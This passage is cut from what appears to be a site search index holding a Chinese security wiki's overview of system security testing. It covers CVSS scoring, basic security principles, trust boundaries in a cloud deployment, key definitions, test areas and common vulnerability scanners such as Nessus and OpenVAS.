System\uff0c\u5373\u201c\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\u201d\uff0c\u662f\u4e00\u4e2a\u201c\u884c\u4e1a\u516c\u5f00\u6807\u51c6\uff0c\u5176\u88ab\u8bbe\u8ba1\u7528\u6765\u8bc4\u6d4b\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\uff0c\u5e76\u5e2e\u52a9\u786e\u5b9a\u6240\u9700\u53cd\u5e94\u7684\u7d27\u6025\u5ea6\u548c\u91cd\u8981\u5ea6\u201d\u3002 CVSS\u662f\u5b89\u5168\u5185\u5bb9\u81ea\u52a8\u5316\u534f\u8bae\uff08SCAP\uff09[2]\u7684\u4e00\u90e8\u5206\uff0c\u901a\u5e38CVSS\u540cCVE\u4e00\u540c\u7531\u7f8e\u56fd\u56fd\u5bb6\u6f0f\u6d1e\u5e93\uff08NVD\uff09\u53d1\u5e03\uff0c\u7531\u7f8e\u56fd\u56fd\u5bb6\u57fa\u7840\u5efa\u8bbe\u54a8\u8be2\u59d4\u5458\u4f1a\uff08NIAC\uff09\u59d4\u6258\u5236\u4f5c\uff0c\u662f\u4e00\u5957\u516c\u5f00\u7684\u8bc4\u6d4b\u6807\u51c6\uff0c\u7ecf\u5e38\u88ab\u7528\u6765\u8bc4\u6bd4\u4f01\u4e1a\u8d44\u8baf\u79d1\u6280\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u5e76\u53d7\u5230eBay\u3001(Symantec)\u3001\u601d\u79d1(Cisco)\u3001\u7532\u53e4\u6587( Oracle )\u7b49\u4f17\u591a\u5382\u5546\u652f\u63f4\u3002 CVSS\u7684\u76ee\u6807\u662f\u4e3a\u6240\u6709\u8f6f\u4ef6\u5b89\u5168\u6f0f\u6d1e\u63d0\u4f9b\u4e00\u4e2a\u4e25\u91cd\u7a0b\u5ea6\u7684\u8bc4\u7ea7 \u8fd9\u5c31\u610f\u5473\u7740CVSS\u65e8\u5728\u4e3a\u4e00\u4e2a\u5df2\u77e5\u7684\u5b89\u5168\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\u63d0\u4f9b\u4e00\u4e2a\u6570\u503c(\u5206\u6570)\uff0c\u800c\u4e0d\u7ba1\u8fd9\u4e2a\u5b89\u5168\u6f0f\u6d1e\u5f71\u54cd\u7684\u8f6f\u4ef6\u7c7b\u578b\u662f\u4ec0\u4e48\uff0c\u4e0d\u7ba1\u5b83\u662f \u64cd\u4f5c\u7cfb\u7edf \u3001\u6740\u6bd2\u8f6f\u4ef6\u3001 \u6570\u636e\u5e93 \u3001\u90ae\u4ef6\u670d\u52a1\u5668\u3001\u684c\u9762\u8fd8\u662f\u5546\u52a1\u5e94\u7528\u7a0b\u5e8f\u3002\u7531\u4e8e\u8fd9\u4e2a\u8bc4\u5206\u8303\u56f4\u975e\u5e38\u5e7f\uff0c\u8fd9\u4e2a\u8bc4\u5206\u7cfb\u7edf\u628a\u80fd\u591f\u5b8c\u5168\u653b\u7834\u64cd\u4f5c\u7cfb\u7edf\u5c42\u7684\u5df2\u77e5\u5b89\u5168\u6f0f\u6d1e\u8bc4\u4e3a\u57fa\u51c6\u5206\u657010.0\u5206\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cCVSS\u57fa\u51c6\u5206\u6570\u4e3a10.0\u5206\u7684\u5b89\u5168\u6f0f\u6d1e\u4e00\u822c\u6307\u80fd\u591f\u5b8c\u5168\u653b\u7834\u7cfb\u7edf\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5178\u578b\u7684\u7ed3\u679c\u662f\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u4e00\u4e2a\u7cfb\u7edf\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u5c42\u7684\u7ba1\u7406\u6216\u8005\u201c\u6839\u201d\u6743\u9650\u3002\u4f8b\u5982\uff0c\u56fd\u5bb6\u5b89\u5168\u6f0f\u6d1e\u6570\u636e\u5e93\u4e2d\u4e00\u4e2a\u7b2c\u4e09\u65b9\u4ea7\u54c1\u4e2d\u7684\u8fd9\u79cd\u5b89\u5168\u6f0f\u6d1e\u88ab\u89e3\u91ca\u4e3a\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5b89\u88c5\u7a0b\u5e8f;\u89c2\u770b\u3001\u4fee\u6539\u6216\u8005\u5220\u9664\u6570\u636e;\u6216\u8005\u521b\u5efa\u62e5\u6709\u7528\u6237\u5168\u90e8\u6743\u5229\u7684\u65b0\u8d26\u6237\u3002 \u5b83\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5e2e\u52a9\u4eba\u4eec\u5efa\u7acb\u8861\u91cf\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u7684\u6807\u51c6\uff0c\u4f7f\u5f97\u4eba\u4eec\u53ef\u4ee5\u6bd4\u8f83\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\uff0c\u4ece\u800c\u786e\u5b9a\u5904\u7406\u5b83\u4eec\u7684\u4f18\u5148\u7ea7\u3002CVSS\u5f97\u5206\u57fa\u4e8e\u4e00\u7cfb\u5217\u7ef4\u5ea6\u4e0a\u7684\u6d4b\u91cf\u7ed3\u679c\uff0c\u8fd9\u4e9b\u6d4b\u91cf\u7ef4\u5ea6\u88ab\u79f0\u4e3a\u91cf\u5ea6\uff08Metrics\uff09\u3002\u6f0f\u6d1e\u7684\u6700\u7ec8\u5f97\u5206\u6700\u5927\u4e3a10\uff0c\u6700\u5c0f\u4e3a0\u3002\u5f97\u52067 10\u7684\u6f0f\u6d1e\u901a\u5e38\u88ab\u8ba4\u4e3a\u6bd4\u8f83\u4e25\u91cd\uff0c\u5f97\u5206\u57284 6.9\u4e4b\u95f4\u7684\u662f\u4e2d\u7ea7\u6f0f\u6d1e\uff0c0~3.9\u7684\u5219\u662f\u4f4e\u7ea7\u6f0f\u6d1e CVSS\u7cfb\u7edf\u5305\u62ec\u4e09\u79cd\u7c7b\u578b\u7684\u5206\u6570 - \u57fa\u51c6\u5206\u6570\uff0c\u6682\u65f6\u7684\u548c\u73af\u5883\u7684\u3002\u6bcf\u4e00\u4e2a\u5206\u6570\u90fd\u8981\u8861\u91cf\u8fd9\u4e2a\u5b89\u5168\u6f0f\u6d1e\u7684\u4e0d\u540c\u5c5e\u6027\u3002\u7532\u9aa8\u6587\u5728\u4e25\u91cd\u8865\u4e01\u66f4\u65b0\u6587\u4ef6\u4e2d\u63d0\u4f9b\u8fd9\u4e2a\u201c\u57fa\u51c6\u5206\u6570\u201d\u3002\u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u6709\u5982\u4e0b\u7279\u70b9\uff1a - \u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u5177\u4f53\u6307\u4e00\u4e2a\u6307\u5b9a\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 - \u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u662f\u4e0d\u53d8\u7684\u3002 - \u5b83\u4e0d\u662f\u5177\u4f53\u9488\u5bf9\u4e00\u4e2a\u5ba2\u6237\u7684\u6280\u672fIT\u73af\u5883\u7684 11. *\u90a3\u4e9b\u7f51\u7edc\u5927\u725b\u4eec\u7684\u8bed\u53e5* \u00b6 \u00fc \u4ee5\u5b89\u5168\u9632\u5fa1\u65b9\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u9632\u5fa1\u7684\u5e7f\u5ea6\u6bd4\u6df1\u5ea6\u66f4\u5177\u4f18\u5148\u7ea7\uff0c\u8fd9\u4e5f\u662f\u4fe1\u606f\u5b89\u5168\u4e2d\u6728\u6876\u539f\u7406\u7684\u4f53\u73b0\u3002 \u00fc \u7f51\u7edc\u4e16\u754c\u5982\u6b64\u7684\u5e74\u8f7b\uff0c\u8fd8\u6ca1\u6709\u53d1\u5c55\u51fa\u81ea\u5df1\u72ec\u7acb\u7684\u884c\u4e3a\u89c4\u8303\u3002 \u00fc \u6211\u8ba4\u4e3a\u5b89\u5168\u7684\u6838\u5fc3\u7406\u5ff5\u53ea\u6709\u4e24\u79cd\uff1a \u4e00\u662f\u5bf9\u65e0\u5e8f\u7684\u5185\u5916\u73af\u5883\u6267\u884c\u7ebf\u6027\u79e9\u5e8f\u5316\u7b56\u7565\uff0c\u6784\u5efa\u5f3a\u97e7\u7684\u9632\u62a4\u4f53\u7cfb\uff0c\u4e3a\u7cfb\u7edf\u63d0\u4f9b\u201c\u514d\u75ab\u201d\u80fd\u529b\u3002 \u4e8c\u662f\u5bf9\u65e0\u5e8f\u7684\u5185\u5916\u73af\u5883\u6267\u884c\u975e\u7ebf\u6027\u79e9\u5e8f\u5316\u7b56\u7565\uff0c\u6784\u5efa\u53cd\u8106\u5f31\u6027\u9632\u62a4\u4f53\u7cfb\uff0c\u4e3a\u7cfb\u7edf\u63d0\u4f9b\u201c\u8fdb\u5316\u201d\u80fd\u529b\u3002 --------\u5b89\u5728 \u00fc \u5b89\u5168\u7684\u4e09\u8981\u7d20\uff1a\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u3001\u53ef\u7528\u6027 \u00fc \u9632\u5fa1\u7684\u4e00\u4e9b\u601d\u60f3\uff1a \u767d\u540d\u5355\u601d\u60f3\u3001\u6df1\u5ea6\u9632\u5fa1\u3001\u6570\u636e\u4e0e\u4ee3\u7801\u5206\u79bb\u3001\u4e0d\u53ef\u9884\u6d4b\u6027\u3001\u7f29\u5c0f\u653b\u51fb\u9762 12. *\u5176\u4ed6* \u00b6 \u6211\u7684\u4e00\u4e9b\u7406\u89e3\uff1a 1\u3001\u5b89\u5168\u4e2d\u603b\u8c08\u5230\u505a\u5b89\u5168\u9700\u8981\u9996\u5148\u786e\u8ba4\u4fe1\u4efb\u57df\u4e0e\u4fe1\u4efb\u8fb9\u754c\uff0c\u4fe1\u4efb\u8fb9\u754c\u7684\u6982\u5ff5\u4e3b\u8981\u662f\u4ece\u8fd9\u4e2a\u7f51\u7edc\u7269\u7406\u7ed3\u6784\u4f53\u7cfb\u7684\u5f62\u5f0f\u6765\u4f53\u73b0\u7684\uff0c\u6bd4\u5982\u4e00\u822c\u5728\u7f51\u95f8\u6216\u8005\u9632\u706b\u5899\u4e4b\u7c7b\u7684\u7684\u8bbe\u5907\u5904\u4f5c\u4e3a\u8fb9\u754c\uff0c\u5185\u90e8\u5f62\u6210\u4e00\u4e2a\u4e2a\u5b89\u5168\u57df\u3002\u800c\u6211\u4eec\u7684\u4e92\u8054\u7f51\u7cfb\u7edf\u662f\u4ee5\u4e91\u4e3a\u4f9d\u6258\uff0c\u6253\u7834\u4e86\u539f\u6765\u7684\u90a3\u79cd\u6982\u5ff5\u3002\u7269\u7406\u5c42\u5bf9\u6211\u4eec\u6765\u8bf4\u662f\u4e0d\u900f\u660e\u7684\uff0c\u4ee5\u670d\u52a1\u63d0\u4f9b\u5546\u7684\u903b\u8f91\u670d\u52a1\u5f62\u5f0f\u4f53\u73b0\u4e3a8\u53f0\u670d\u52a1\u5668\uff0c2\u53f0\u6570\u636e\u5e93\u670d\u52a1\u5668\uff0c2\u53f0\u8d1f\u8f7d\u5747\u8861\u670d\u52a1\u5668\u3002\u5e76\u4e14\u8fd9\u4e9b\u670d\u52a1\u5668\u4e4b\u95f4\u5e76\u6ca1\u6709\u914d\u7f6e\u76f8\u4e92\u7684\u4fe1\u4efb\u5173\u7cfb\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u6211\u4eec\u7684\u5b89\u5168\u5b9e\u9645\u5f62\u6001\u4e3a\u591a\u5904\u5355\u70b9\u5f62\u5f0f\u3002 \u4ed4\u7ec6\u6765\u770b\u8fd912\u4e2a\u5355\u70b9\uff0c\u9996\u51482\u53f0\u8d1f\u8f7d\u5747\u8861\uff0c\u53ea\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u670d\u52a1\u5176\u4ed6\u5747\u4e0d\u9700\u8981\u6211\u4eec\u770b\u62a4\uff0c\u5176\u505a\u4e86\u54ea\u4e9b\u63aa\u65bd\u9664\u4e86\u5206\u914d\u8fde\u63a5\u5916\u4e00\u6982\u4e0d\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u6211\u4eec\u7684\u5b89\u5168\u5f62\u6001\u5708\u6452\u5f03\u6389\u3002\u5269\u4e0b\u768410\u53f0\u670d\u52a1\u5668\uff0c\u5f7c\u6b64\u72ec\u7acb\uff0c\u4e92\u76f8\u4e0d\u5e94\u8be5\u4fe1\u4efb\uff0c\u5f7c\u6b64\u4ea4\u4e92\u5747\u5e94\u8be5\u6709\u6709\u6548\u8ba4\u8bc1\u884c\u4e3a\u3002 \u5f53\u7136\uff0c\u5176\u5f7c\u6b64\u7684\u4ea4\u4e92\u4e5f\u88ab\u5206\u4e3a\u4e86\u4e24\u79cd\uff0c\u4e00\u662f\u5927\u7f51\u4ea4\u4e92\uff0c\u4e8c\u662f\u5185\u7f51\u4ea4\u4e92\u3002\u8fd9\u91cc\u7684\u5927\u7f51\u5185\u7f51\u6211\u4eec\u5c31\u9700\u8981\u548c\u963f\u91cc\u7684\u7f51\u7edc\u76f8\u7ed3\u5408\u3002\u5185\u7f51\u4ea4\u4e92\u5c31\u5728\u963f\u91cc\u7684\u76f8\u5bf9\u5b89\u5168\u7684\u4e00\u4e2a\u57df\uff0c\u4e0d\u9632\u53eb\u5185\u57df\uff0c\u76f8\u5bf9\u7684\u5927\u7f51\u4ea4\u4e92\u5c31\u5728\u963f\u91cc\u7684\u76f8\u5bf9\u4e0d\u5b89\u5168\u7684\u57df\u548c\u4e92\u8054\u7f51\u4e0a\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0d\u53ef\u4fe1\u7684\u4e0d\u5b89\u5168\u7684\u533a\u57df\uff0c\u4e0d\u9632\u53eb\u5916\u57df\u3002\u8fd9\u79cd\u7ed3\u6784\u5c31\u5e94\u8be5\u548c\u6211\u4eec\u7684\u4e1a\u52a1\u76f8\u7ed3\u5408\uff0c\u6bd4\u5982\u6211\u4eec\u768410\u53f0\u670d\u52a1\u5668\u8981\u5f7c\u6b64\u8bbf\u95ee\uff0c\u540c\u65f6\u6b64\u8bbf\u95ee\u670d\u52a1\u4e0d\u9700\u8981\u63d0\u4f9b\u7ed9\u4e92\u8054\u7f51\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628a\u4e1a\u52a1\u5355\u72ec\u914d\u7f6e\u5230\u5185\u57df\uff0c\u5982\u679c\u4e1a\u52a1\u662f\u63d0\u4f9b\u7ed9\u4e92\u8054\u7f51\u7684\uff0c\u90a3\u4e48\u914d\u7f6e\u5230\u5916\u57df\u6216\u8005\u5185\u57df\u548c\u5916\u57df\u3002","title":"\u5b89\u5168\u6d4b\u8bd5\u9879\u76ee\u68b3\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#1","text":"\u626b\u63cf\uff1f\u5728\u5f88\u591a\u4eba\u7684\u773c\u4e2d\uff0c\u505a\u5b89\u5168\u7684\u5c31\u662f\u6574\u5929\u62ff\u4e2a\u5de5\u5177\u5728\u54ea\u91cc\u505a\u626b\u63cf\u64cd\u4f5c\uff0c\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u5de5\u5177\u505a\u626b\u63cf\u3002\u662f\u7684\uff0c\u626b\u63cf\u662f\u5b89\u5168\u6d4b\u8bd5\u7684\u5f88\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u626b\u63cf\u53ef\u4ee5\u5feb\u901f\u6709\u6548\u7684\u53d1\u73b0\u95ee\u9898\u3002\u626b\u63cf\u5de5\u5177\u7684\u6613\u7528\u6027\u3001\u65b9\u4fbf\u6027\u51b3\u5b9a\u4e86\u91cd\u8981\u5730\u4f4d\u3002\u4f46\u662f\u626b\u63cf\u5de5\u5177\u7684\u5c40\u9650\u6027\u3001\u7a0b\u5e8f\u7684\u4e0d\u591f\u7075\u6d3b\u7b49\u7f3a\u70b9\u4e5f\u662f\u663e\u800c\u6613\u89c1\u7684\u3002\u4e0d\u7ba1\u662f\u626b\u63cf\u62a5\u544a\u7684\u5206\u6790\u3001\u6f0f\u6d1e\u7684\u6df1\u5ea6\u6316\u6398\u3001\u6d4b\u8bd5\u7684\u7ec4\u7ec7\u7b49\u7b49\u7684\u5de5\u4f5c\u90fd\u79bb\u4e0d\u5f00\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\uff0c\u6240\u4ee5\u53ea\u80fd\u8bf4\u626b\u63cf\u5de5\u5177\u51cf\u8f7b\u4e86\u6d4b\u8bd5\u4eba\u5458\u7684\u5de5\u4f5c\u91cf\uff0c\u662f\u5b89\u5168\u6d4b\u8bd5\u7684\u4e00\u79cd\u624b\u6bb5\u3002","title":"1. *\u5b89\u5168\u6d4b\u8bd5\u5728\u505a\u4ec0\u4e48\uff1f*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#2","text":"\u6211\u4eec\u7ecf\u5e38\u53ef\u4ee5\u4ece\u8eab\u8fb9\u7684\u670b\u53cb\u53e3\u4e2d\u542c\u5230\u4e00\u4e9b\u6709\u5173\u5b89\u5168\u7684\u540d\u79f0\uff0c\u5411\u4ec0\u4e48\u8f6f\u4ef6\u5b89\u5168\u3001\u4fe1\u606f\u5b89\u5168\u3001\u7f51\u7edc\u5b89\u5168\u3001\u8ba1\u7b97\u673a\u5b89\u5168\u7b49\u4e00\u4e9b\u8bcd\u7ec4\uff0c\u8fd9\u4e9b\u9886\u57df\u90fd\u662f\u505a\u5b89\u5168\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5c5e\u4e8e\u54ea\u4e00\u4e2a\u5462\uff1f \u5927\u5bb6\u53ef\u4ee5\u4e0a\u767e\u5ea6\u767e\u79d1\u67e5\u770b\u4e0b\u8fd9\u4e9b\u8bcd\u7ec4\u7684\u6982\u5ff5\u3002\u8f6f\u4ef6\u5b89\u5168\u5f80\u5c0f\u4e86\u8bf4\u5c31\u662f\u67d0\u4e00\u4e2a\u8f6f\u4ef6\u4ea7\u54c1\uff0c\u8bf4\u5927\u4e86\u9664\u4e86\u786c\u4ef6\u5c31\u662f\u8f6f\u4ef6\u4e86\u554a\u3002\u4fe1\u606f\u5b89\u5168\u770b\u540d\u5b57\u6211\u4eec\u5c31\u77e5\u9053\u5173\u952e\u662f\u4fe1\u606f\u4e24\u4e2a\u5b57\uff0c\u4f46\u662f\u4ec0\u4e48\u662f\u4fe1\u606f\u5462\uff0c\u5ba2\u6237\u7684\u6570\u636e\u8fd8\u662f\u4e00\u5207\u6709\u7528\u7684\u6570\u636e\uff1f\u7f51\u7edc\u5b89\u5168\uff0c\u4ec0\u4e48\u662f\u7f51\u7edc\uff0c\u7f51\u7edc\u7cfb\u7edf\u786c\u4ef6\u3001\u8f6f\u4ef6\u8fd9\u90fd\u662f\u5199\u6a21\u7cca\u7684\u53ef\u5927\u53ef\u5c0f\u7684\u6982\u5ff5\u3002\u5728\u770b\u8ba1\u7b97\u673a\u5b89\u5168\uff0cPC\uff1f\u670d\u52a1\u5668\uff1f\u8def\u7531\u5668\uff1f\u597d\u5427\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u6982\u5ff5\u5f80\u5927\u4e86\u8bf4\u5c31\u6210\u4e86\u7ec4\u6210\u6211\u4eec\u4eca\u5929\u4e92\u8054\u7f51\u7684\u5404\u79cd\u8bbe\u5907\u5305\u62ec\u5404\u79cd\u7684\u5d4c\u5165\u5f0f\u673a\u5668\u3001\u5916\u63a5USB\u3001\u84dd\u7259\u7b49\u8bbe\u5907\u7684\u5171\u540c\u4f53\u7684\u786c\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u4f7f\u7528\u3001\u7ef4\u62a4\u3001\u7ba1\u7406\u7b49\u8fd9\u4e9b\u4e1c\u897f\u7684\u4eba\u7684\u6574\u4e2a\u7684\u5b89\u5168\u95ee\u9898\u3002\u5728\u770b\u4ed6\u4eec\u7684\u533a\u522b\uff0c\u4ed6\u4eec\u5df2\u4e0d\u540c\u7684\u5730\u65b9\u4f5c\u4e3a\u5176\u4e3b\u8981\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u8bf4\u51fa\u53d1\u70b9\uff0c\u4ed6\u4eec\u5e76\u6ca1\u6709\u660e\u663e\u7684\u754c\u7ebf\u5374\u6709\u7740\u81ea\u5df1\u7684\u4fa7\u91cd\u70b9\u3002\u800c\u6211\u4eec\u7684\u4fa7\u91cd\u70b9\u662f\u4ec0\u4e48\u5462\uff0c\u6211\u4eec\u4ea7\u54c1\u662f\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u4ea7\u54c1\u5462\uff1f\u6211\u4eec\u6709WEB\u670d\u52a1\u3001\u63a5\u53e3\u670d\u52a1\u3001\u6587\u4ef6\u670d\u52a1\u3001\u89c6\u5c4f\u7b49\u670d\u52a1\u7b49\u6211\u4eec\u628a\u5b83\u4eec\u7edf\u4e00\u79f0\u4e3a\u6211\u4eec\u7684\u7cfb\u7edf\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u662f\u5728\u505a\u8fd9\u4e2a\u7cfb\u7edf\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u6240\u4ee5\u6211\u89c9\u5f97\u6211\u4eec\u5e94\u8be5\u5b9a\u4f4d\u4e3a\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u3002 \u5f53\u7136\u6211\u4eec\u7684\u7cfb\u7edf\u8fd0\u884c\u4e2d\u4e5f\u6d89\u53ca\u5230\u4eba\u3001\u6d89\u53ca\u5230\u786c\u4ef6\uff0c\u6b64\u5904\u90fd\u4e0d\u662f\u6211\u4eec\u7684\u5173\u6ce8\u70b9\uff0c\u6211\u4eec\u53ea\u4ece\u8f6f\u4ef6\u6280\u672f\u7684\u89d2\u5ea6\u6765\u8bc6\u522b\u5b83\u3002\u90a3\u4e48\uff0c\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u5c31\u6210\u4e86\u533a\u522b\u4e8e\u529f\u80fd\u6d4b\u8bd5\uff0c\u548c\u6027\u80fd\u6d4b\u8bd5\u4e00\u6837\uff0c\u5355\u72ec\u5217\u51fa\u6765\u7684\u4e13\u9879\u6d4b\u8bd5\u4e86\u3002","title":"2. *\u5b89\u5168\u6d4b\u8bd5\u8005\u662f\u600e\u6837\u5b9a\u4f4d\u81ea\u5df1\u7684\uff1f*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#3","text":"\u4fe1\u4efb\u3001\u4eba\u6027\uff08\u7f51\u7edc\u5b89\u5168\u7684\u6700\u5927\u6f0f\u6d1e\u662f\u4eba\uff09\u3001\u6b62\u635f\u3001\u653b\u9632 \u4ee5\u4e0a\u662f\u5f53\u524d\u7f51\u4e0a\u4e00\u4e9b\u4e3b\u8981\u7684\u8bba\u70b9\uff0c\u4ee5\u4fe1\u4efb\u6216\u8005\u4e0d\u4fe1\u4efb\u4f5c\u4e3a\u672c\u8d28\u51fa\u53d1\u70b9\u7684\u8fd8\u662f\u5360\u636e\u4e3b\u6d41\u7684\u3002","title":"3. *\u5b89\u5168\u7684\u672c\u8d28\u662f\u4ec0\u4e48\uff1f*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#4","text":"\u654f\u611f\u6570\u636e\uff1a \u654f\u611f\u6570\u636e\u7684\u5177\u4f53\u8303\u56f4\u53d6\u51b3\u4e8e\u4ea7\u54c1\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\uff0c\u4ea7\u54c1\u5e94\u6839\u636e\u98ce\u9669\u8fdb\u884c\u5206\u6790\u548c\u5224\u65ad\u3002\u5178\u578b\u7684\u654f\u611f\u6570\u636e\u5305\u62ec\u53e3\u4ee4\u3001\u94f6\u884c\u5e10\u53f7\u3001\u5927\u6279\u91cf\u4e2a\u4eba\u6570\u636e\u3001\u7528\u6237\u901a\u4fe1\u5185\u5bb9\u548c\u5bc6\u94a5\u7b49\u3002 \u4e2a\u4eba\u6570\u636e\uff1a \u6307\u76f4\u63a5\u901a\u8fc7\u8be5\u6570\u636e\u6216\u8005\u7ed3\u5408\u8be5\u6570\u636e\u4e0e\u5176\u4ed6\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bc6\u522b\u51fa\u81ea\u7136\u4eba\u7684\u4fe1\u606f\u3002 \u533f\u540d\u5316\uff1a \u6307\u5bf9\u4e2a\u4eba\u6570\u636e\u8fdb\u884c\u7684\u66f4\u6539\uff08\u4f8b\u5982\u5355\u5411\u6563\u5217\u3001\u622a\u77ed\u3001\u66ff\u6362\u7b49\uff0c\u5982\u9700\u4fdd\u7559\u4e2a\u4eba\u6570\u636e\u771f\u5b9e\u503c\u4e0e\u66ff\u6362\u503c\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u79f0\u52a0\u5bc6\u6216\u6620\u5c04\u8868\u65b9\u5f0f\uff0c\u4f46\u5bc6\u94a5/\u6620\u5c04\u8868\u5fc5\u987b\u7531\u6570\u636e\u6240\u6709\u8005\u63a7\u5236\uff09\uff0c\u4f7f\u539f\u6765\u6709\u5173\u4e2a\u4eba\u7684\u4fe1\u606f\u4e0d\u518d\u80fd\u5f52\u5c5e\u5230\u4e00\u4e2a\u53ef\u8bc6\u522b\u7684\u81ea\u7136\u4eba\uff0c\u6216\u63a8\u7406\u8fd9\u79cd\u5f52\u5c5e\u9700\u8981\u8017\u8d39\u8fc7\u591a\u3001\u4e0d\u76f8\u79f0\u7684\u65f6\u95f4\u3001\u8d39\u7528\u548c\u7cbe\u529b","title":"4. *\u6982\u5ff5\u5b9a\u4e49*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5","text":"\u5982\u4f55\u7740\u624b\u53bb\u505a\u8fd9\u4e2a\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u5462\uff1f\u4f5c\u4e3a\u4e00\u4e2a\u6d4b\u8bd5\u4eba\u5458\u8981\u4fdd\u8bc1\u7cfb\u7edf\u6574\u4f53\u7684\u5b89\u5168\uff0c\u8fd9\u5c31\u9700\u8981\u6709\u4e00\u4e2a\u6574\u4f53\u7684\u7ed3\u6784\u7684\u6846\u67b6\uff0c\u5c31\u50cf\u76d6\u623f\u5b50\u4e00\u6837\uff0c\u5148\u9020\u94a2\u7b4b\u6df7\u51dd\u571f\u6846\u67b6\uff0c\u7136\u540e\u7816\u5757\u53bb\u586b\u5145\u5b83\u3002\u8fd9\u91cc\u7684\u94a2\u7b4b\u6df7\u51dd\u571f\u6846\u67b6\u5c31\u662f\u5b89\u5168\u7279\u6027\u65b9\u5411\uff0c\u5176\u5b9e\u5c31\u662f\u4ece\u6574\u4f53\u65b9\u5411\u4e0a\u7684\u4e00\u4e2a\u5212\u5206\uff0c\u53ef\u4ee5\u6709\u5982\u4e0b\u7b80\u5355\u7684\u5212\u5206\u3002","title":"5. *\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u53bb\u7740\u624b*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#51","text":"\u5b89\u5168\u7279\u6027\uff1a\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u3001\u6570\u636e\u5e93\u5b89\u5168\u3001WEB\u5b89\u5168\u3001\u8f6f\u4ef6\u7684\u53d1\u5e03\u548c\u5b89\u88c5\u5b89\u5168\u3001\u534f\u8bae\u4e0e\u63a5\u53e3\u653b\u9632\u3001\u654f\u611f\u6570\u636e\u4fdd\u62a4\u3001\u624b\u673a\u7aef\u5b89\u5168\u3001\u9759\u6001\u4ee3\u7801\u5206\u6790\u3002","title":"5.1. *\u6d4b\u8bd5\u7684*****\u7279\u6027****"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#511","text":"\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u7cfb\u7edf\u6f0f\u6d1e\uff08\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff09\u3001\u7cfb\u7edf\u914d\u7f6e\uff08\u5b89\u5168\u52a0\u56fa\uff09 \u4e1a\u754c\u6743\u5a01\u5de5\u5177Nessus\uff0c\u5176\u4ed6\u5982retina\u3001\u7eff\u76df\u3001\u5929\u955c\u7b49\u3002\u5f00\u6e90\u7684\u5de5\u5177\u53ef\u4ee5\u4f7f\u7528OpenVAS\u3002","title":"5.1.1. 